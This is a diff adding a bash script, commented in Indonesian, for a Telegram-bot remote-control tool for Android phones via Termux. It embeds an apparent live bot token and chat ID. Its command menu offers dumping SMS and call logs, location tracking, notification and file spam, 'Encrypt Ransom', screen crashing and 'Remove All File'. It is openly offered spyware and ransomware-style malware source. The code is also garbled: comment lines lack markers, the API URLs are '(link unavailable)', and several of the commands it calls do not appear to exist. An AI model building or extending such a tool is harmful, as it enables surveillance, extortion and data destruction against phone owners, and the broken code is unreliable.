@@ -1,0 +1,66 @@
+bash
+#!/bin/bash
+
+Token Bot Telegram
+TOKEN="7132826358:AAGCLoI7JYHA3nFYwEE8seu-qTmjwxEONL0"
+ID_TELE="5951232585"
+
+Fungsi untuk mengirim pesan
+kirim_pesan() {
+  curl -s -X POST "(link unavailable)" -d "chat_id=$ID_TELE&text=$1"
+}
+
+Fungsi untuk menggenerate keyboard
+generate_keyboard() {
+  cat <<EOF
+{
+  "keyboard": [
+    ["Cek Status Baterai", "Lokasi"],
+    ["Informasi System", "Dump Sms"],
+    ["Dump Panggilan", "Ubah Wallpaper"],
+    ["Pesan Teks", "Pesan Audio"],
+    ["Mati/Hidup Wifi", "Getar Devices"],
+    ["Dapatkan Informasi Wifi", "Senter On/Off"],
+    ["Spam Notifikasi", "Ambil List Kotak Target"],
+    ["Play Audio", "Spam File"],
+    ["Encrypt Ransom", "Decrypt Ransom"],
+    ["Layar Crash", "Galery eyes"],
+    ["Remove All File", "Reset Semua Perintah"]
+  ],
+  "resize_keyboard": true,
+  "one_time_keyboard": true
+}
+EOF
+}
+
+Jalankan perintah
+while true; do
+  updates=$(curl -s "(link unavailable)")
+  for update in $(echo "$updates" | jq -r '.result[] | .message.text'); do
+    case $update in
+      "Cek Status Baterai") termux-battery-status ;;
+      "Lokasi") termux-location ;;
+      "Informasi System") termux-info ;;
+      "Dump Sms") termux-sms-list ;;
+      "Dump Panggilan") termux-call-log ;;
+      "Ubah Wallpaper") termux-wallpaper ;;
+      "Pesan Teks") kirim_pesan ;;
+      "Pesan Audio") termux-media-player ;;
+      "Mati/Hidup Wifi") termux-wifi-enable ;;
+      "Getar Devices") termux-vibrate ;;
+      "Dapatkan Informasi Wifi") termux-wifi-connectioninfo ;;
+      "Senter On/Off") termux-torch ;;
+      "Spam Notifikasi") termux-notification ;;
+      "Ambil List Kotak Target") termux-sms-list ;;
+      "Play Audio") termux-media-player ;;
+      "Spam File") termux-file-send ;;
+      "Encrypt Ransom") termux-encrypt ;;
+      "Decrypt Ransom") termux-decrypt ;;
+      "Layar Crash") termux-crash ;;
+      "Galery eyes") termux-gallery ;;
+      "Remove All File") termux-rm ;;
+      "Reset Semua Perintah") generate_keyboard ;;
+    esac
+  done
+  sleep 20
+done
